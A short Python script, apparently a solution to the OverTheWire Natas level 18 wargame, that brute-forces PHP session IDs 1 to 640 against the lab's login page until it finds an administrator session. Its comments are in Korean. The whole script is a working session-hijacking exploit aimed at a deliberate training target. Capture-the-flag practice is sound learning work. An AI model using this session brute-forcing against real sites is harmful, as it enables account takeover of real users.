from requests import request as req


def request(sid: str):
    res = req(
        url="http://natas18.natas.labs.overthewire.org/index.php",
        method="POST",
        auth=("natas18", "6O...CJ"),
        cookies={"PHPSESSID": sid},
    )

    return res


i = 1
# maxid 범위 640에 맞춰 반복
while i <= 640:
    print(i)
    res = request(str(i))
    # 일반 유저일 때 응답 이외의 것을 찾음
    if "You are logged in as a regular user" not in res.text:
        print(i)
        print(res.text)
        break
    else:
        i += 1
